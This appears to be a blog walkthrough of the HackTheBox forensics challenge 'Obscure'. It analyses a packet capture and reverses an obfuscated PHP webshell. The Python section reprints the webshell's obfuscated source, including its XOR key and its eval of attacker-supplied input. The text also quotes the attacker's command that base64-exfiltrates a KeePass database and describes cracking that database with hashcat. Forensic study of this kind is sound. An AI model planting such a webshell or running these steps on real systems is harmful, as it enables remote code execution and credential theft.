---
title: HackTheBox - Obscure
author: solidgoat
date: 2023-03-30 21:00:00 EDT
categories: [HackTheBox, Forensics]
tags: [forensics, challenges, hackthebox, htb, walkthrough, easy, wireshark, php, obfuscation, keepass, password cracking, webshell]
image:
  path: /assets/img/posts/Obscure/forensics-logo.png
  width: 200
  height: 200
  alt: Walkthrough of Obscure from HackTheBox
---

## Task

An attacker has found a vulnerability in our web server that allows arbitrary PHP file upload in our Apache server. Suchlike, the hacker has uploaded a what seems to be like an obfuscated shell (support.php). We monitor our network 24/7 and generate logs from tcpdump (we provided the log file for the period of two minutes before we terminated the HTTP service for investigation), however, we need your help in analyzing and identifying commands the attacker wrote to understand what was compromised.

### Tools Used

* [Wireshark](https://www.wireshark.org/)
* Python
* [Burp Suite](https://portswigger.net/burp)
* [hashcat](https://hashcat.net/hashcat/)
* [KeePass](https://keepass.info/)

## Initial Assessment

So we're given a PCAP file, the PHP webshell that was used during the attack, and a description of the task (`to-do.txt`).

As indicated from the description, looking at `support.php` shows an obfuscated PHP file. We'll probably have to come back to this; let's take a look at the tcpdump.

<img src="/assets/img/posts/Obscure/support-php-webshell.png">

So we open the PCAP file with Wireshark and we immediately see a `GET` request to `/upload.php`.

<img src="/assets/img/posts/Obscure/wireshark-upload-php.png">

Looking at the TCP stream shows nothing special; we'll go to the next stream.

<img src="/assets/img/posts/Obscure/wireshark-stream0.png">

Now this one looks more insteresting; it's a `POST` request to `/uploads/support.php`. It almost looks like `base64` being sent as the input and `base64` being returned as the output.

<img src="/assets/img/posts/Obscure/wireshark-stream1.png">

But if we try to decode that, we get a bunch of garbage. So we're probably going to have to reverse the webshell to see what that input and output is.

<img src="/assets/img/posts/Obscure/base64-decode-attempt.png">

Before I started that process, I looked through the HTTP files to see if there was anything of interest that could be exported.

<img src="/assets/img/posts/Obscure/wireshark-http-export.png">

We already have the `support.php` file and the larger ones seem to be the output of one of the TCP streams.

<img src="/assets/img/posts/Obscure/wireshark-http-export-support-php.png">

## Reversing Support.php

So this looks like a mess, but it's just doing a `str_replace()` throughout the file - `Line 6` and `Line 8`.

<img src="/assets/img/posts/Obscure/support-php-webshell-callouts.png">

I don't really work with PHP, so I did this task in Python.

I commented out some lines, removed the semicolon line terminators, and just did a string replace on the necessary lines.

```python
V='$k="80eu)u)32263";$khu)=u)"6f8af44u)abea0";$kf=u)"35103u)u)9f4a7b5";$pu)="0UlYu)yJHG87Eu)JqEz6u)"u)u);function u)x($'
P='++)u){$o.=u)$t{u)$i}^$k{$j};}}u)retuu)rn $o;}u)if(u)@pregu)_u)match("/$kh(.u)+)$kf/",@u)u)file_u)getu)_cu)ontents('
d='u)t,$k){u)$c=strlu)en($k);$l=strlenu)($t)u);u)$o=""u);for($i=0u);u)$i<$l;){for(u)$j=0;(u)$u)j<$c&&$i<$l)u)u);$j++,$i'
B='ob_get_cou)ntu)ents();@obu)_end_cleu)anu)();$r=@basu)e64_eu)ncu)ode(@x(@gzu)compress(u)$o),u)$k));pru)u)int(u)"$p$kh$r$kf");}'
#N=str_replace('FD','','FDcreFDateFD_fFDuncFDFDtion')
c='"php://u)input"),$u)m)==1){@u)obu)_start();u)@evau)l(@gzuu)ncu)ompress(@x(@bau)se64_u)decodu)e($u)m[1]),$k))u));$u)ou)=@'
#u=str_replace('u)','',$V.$d.$P.$c.$B)
#x=$N('',$u);$x()

print('FDcreFDateFD_fFDuncFDFDtion'.replace('FD', ''))

for line in [V, d, P, c, B]:
    print(line.replace('u)', ''))
```

Here's the result.

<img src="/assets/img/posts/Obscure/support-php-decoder.png">

It stills looks a little... ugly, so I formatted it to make it easier to read.

<img src="/assets/img/posts/Obscure/support-php-webshell-decoded-pretty.png">

Before I went any further I did some research on some of the functions that I was unfamiliar with. `create_function()` being one of those.

I was met with this. Apparently `create_function()` has been deprecated, but maybe we don't need it since we can "build" the function ourselves.

<img src="/assets/img/posts/Obscure/php-create-function-deprecated.png">

So going through this code, it looks like the first function loops through and does a bit flip on the input - `Line 15`. Then returns it as variable `$o`.

<img src="/assets/img/posts/Obscure/support-php-webshell-decoded-bitwise.png">

Then `preg_match()` matches on a regex on `php://input`, which is essentially an input stream, and stores it in the variable `$m`.

Next, it uncompresses and decodes the obfuscated input using `@gzuncompress` and `@base64_decode`, and executes it with `@eval` - `Line 24`.

<img src="/assets/img/posts/Obscure/support-php-webshell-decoded-function2.png">

Then encodes and compresses the results using `@base64_encode` and `@gzcompress` - `Line 26`.

<img src="/assets/img/posts/Obscure/support-php-webshell-decoded-function3.png">

Finally, it prints the results, but with padding - `$p=0UlYyJHG87EJqEz6`, `$kh=6f8af44abea0`, `$kf=351039f4a7b5`.

`$r` is actually the result and it's in the middle of that mess.

<img src="/assets/img/posts/Obscure/support-php-webshell-decoded-function4.png">

## Decoding the Attack

So I probably could have made a PHP function to decode the results from the tcpdump, but I'm still learning and thought it would be simpler to host the modified PHP file on an Apache server and feed it the encoded input.

But first we need to change `@eval` to `print()` so we're not executing code. And we also want to be able to see the input, so I printed `$o` and commented out `$r`.

<img src="/assets/img/posts/Obscure/support-php-webshell-decoded-defused.png">

I launched Burp Suite and went to `http://localhost/support_modified.php` and sent it a `POST` request using the values from the tcpdump.

And it looks like we have some positive results.

<img src="/assets/img/posts/Obscure/burp-results1.png">

I went through each input and it was basically all directory listings except for the last TCP stream. This one was calling `@system('base64 -w 0 pwdb.kdbx 2>&1')`, which looks like it was exfiltrating the `pwdb.kdbx` file using base64.

<img src="/assets/img/posts/Obscure/burp-keepass-file.png">

This one also had the largest output out of all the streams, so I assumed the output was the actual file.

<img src="/assets/img/posts/Obscure/burp-keepass-file-encoded-output.png">

I suppose I do need to reconstruct this file to move forward because I don't see the flag anywhere else in the tcpdump.

And I suppose I do need to modify the PHP file and run it manually to get the decoded output.

I simply added the output as a variable (`$z`) to the PHP file, then instead of taking `@file_get_contents("php://input")` as input, I replaced that with my variable (`$z`).

<img src="/assets/img/posts/Obscure/keepass-file-decoded.png">

And I got the decoded, `base64` output.

<img src="/assets/img/posts/Obscure/keepass-file-decoded-output.png">

I just piped that to `base64 -d` and outputted that to a file.

<img src="/assets/img/posts/Obscure/keepass-file-decoded-base64.png">

So now I have this KeePass file. I first tried looking through the entire tcpdump for what could be the password; I even decoded all the outputs from `support.php`, but I couldn't find anything that resembled a password.

I then searched online for how to break into a KeePass database and apparently `hashcat` or `John the Ripper` is able to. I have an affinity towards `hashcat`, so I used that.

First I needed to convert the file to a hash using `keepass2john`, then I fed that into `hashcat` using the `rockyou.txt` wordlist.

<img src="/assets/img/posts/Obscure/keepass2john-output.png">

And we got the flag!

<img src="/assets/img/posts/Obscure/keepass-flag.png">